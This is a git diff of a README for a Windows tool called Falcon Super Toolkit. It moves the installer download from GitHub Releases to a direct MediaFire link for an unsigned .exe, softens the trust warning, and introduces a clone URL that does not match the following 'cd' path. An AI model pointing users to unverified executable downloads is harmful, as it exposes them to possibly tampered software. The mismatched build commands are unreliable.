@@ -50,13 +50,24 @@ Add your actual application screenshots to the repository and update the image p
 
 ## 🚀 Installation
 
-### Option 1: Download the Installer (Recommended)
+### Option 1: Download the Latest Installer (Recommended)
 
-1. Visit the [GitHub Releases](https://github.com/paulmendoza24/your-repo-name/releases) page.
-2. Download the latest installer:
+<kbd>Version 1.0.1</kbd>
 
-   `FalconSuperToolkit_Setup_v1.0.1.exe`
+Download the official Falcon Super Toolkit installer:
 
+<p align="center">
+  <a href="https://download1324.mediafire.com/g2hbbxlobjkgL9_zPleeExfWX26quKK95QKDU-mNheof3dkANShI1-vtDkpF2DtLVyjN4We-T2fI4TnRE0weAf-RtEThU6RHA5dPUyDNACht08ECZNIy0lA1tolZ-oWfn4uZ5qe9q6iUNKyNpcP3DC39OlKz1aJha-GMqQHkAeXHAg/gvgpj7ocksuvl91/FalconSuperToolkit_Setup_v1.0.1.exe">
+    <img src="https://img.shields.io/badge/Download-Falcon%20Super%20Toolkit%20v1.0.1-00c853?style=for-the-badge&logo=windows&logoColor=white" alt="Download Falcon Super Toolkit">
+  </a>
+</p>
+
+**Installer:** `FalconSuperToolkit_Setup_v1.0.1.exe`
+
+**Installation Steps:**
+
+1. Click the Download button above.
+2. Download `FalconSuperToolkit_Setup_v1.0.1.exe`.
 3. Run the installer.
 4. Follow the installation wizard.
 5. Launch Falcon Super Toolkit from your Desktop or Start Menu.
@@ -67,7 +78,7 @@ Add your actual application screenshots to the repository and update the image p
 
 Windows Defender SmartScreen may display a warning if the executable is not signed with a trusted code-signing certificate.
 
-Only proceed if you obtained the installer from a trusted source and have reviewed the application.
+Only proceed if you trust the source and have reviewed the application.
 
 ## 🛠️ Build from Source
 
@@ -80,14 +91,14 @@ Only proceed if you obtained the installer from a trusted source and have review
 ### 1. Clone the Repository
 
 ```bash
-git clone https://github.com/paulmendoza24/your-repo-name.git
-cd your-repo-name
+git clone https://github.com/paulmendoza24/yFalconSuperToolkit.git
+cd FalconSuperToolkit
 ```
 
 ### 2. Install Dependencies
 
 ```bash
-pip install customtkinter psutil pillow
+pip install -r requirements.txt
 ```
 
 ### 3. Prepare Assets
@@ -145,11 +156,9 @@ dist/FalconSuperToolkit.exe
 ## 📂 Project Structure
 
 ```text
-Falcon-Super-Toolkit/
+FalconSuperToolkit/
 │
 ├── falcon_toolkit.py
-├── version_info.txt
-├── app.manifest
 ├── README.md
 │
 ├── assets/
@@ -161,8 +170,7 @@ Falcon-Super-Toolkit/
 │   ├── settings.png
 │   └── about.png
 │
-└── dist/
-    └── FalconSuperToolkit.exe
+└── FalconSuperToolkit.exe
 ```
 
 ## 🔗 Third-Party Integrations
